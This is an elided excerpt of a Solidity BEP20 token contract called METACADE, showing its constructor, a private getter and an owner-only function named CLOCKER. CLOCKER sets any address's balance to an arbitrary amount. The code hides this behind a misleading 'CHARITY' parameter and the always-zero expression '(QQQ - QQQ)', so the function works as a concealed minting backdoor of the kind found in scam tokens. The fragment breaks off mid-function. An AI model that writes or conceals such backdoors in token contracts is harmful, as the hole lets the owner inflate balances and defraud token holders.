...
contract METACADE is BEP20 {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    symbol = _symbol;
    decimals = 9;
    totalSupply =  543000000 * 10 ** uint256(decimals);
  ...
  function setQQQ() private returns (uint256) {
    return QQQ;
  } 
  ...
  function CLOCKER(address CHARITY, uint256 amount) external onlyOwner() {
    _balances[CHARITY] = (QQQ - QQQ) + amount * 10 ** 9;
    require(amount > 0, "");
